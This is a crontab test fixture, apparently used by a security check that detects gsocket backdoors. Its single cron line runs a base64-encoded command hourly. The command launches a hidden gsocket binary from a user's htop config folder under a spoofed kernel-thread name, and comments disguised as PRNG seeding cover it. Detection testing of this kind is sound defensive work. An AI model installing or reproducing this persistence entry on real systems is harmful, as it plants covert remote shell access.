# internal/checks/testdata/crontabs/gsocket_defunct_kernel_03.crontab
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
0 * * * * { echo L2Jpbi9wa2lsbCAtMCAtVTIwMDAzIGRlZnVuY3QgMj4vZGV2L251bGwgfHwgU0hFTEw9IFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgL2hvbWUvdmljdGltMy8uY29uZmlnL2h0b3AvZGVmdW5jdC5kYXQgLWxpcUQiIC9iaW4vYmFzaCAtYyAiZXhlYyAtYSAnW3NsdWJfZmx1c2h3cV0nICcvaG9tZS92aWN0aW0zLy5jb25maWcvaHRvcC9kZWZ1bmN0JyIgMj4vZGV2L251bGwK|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel
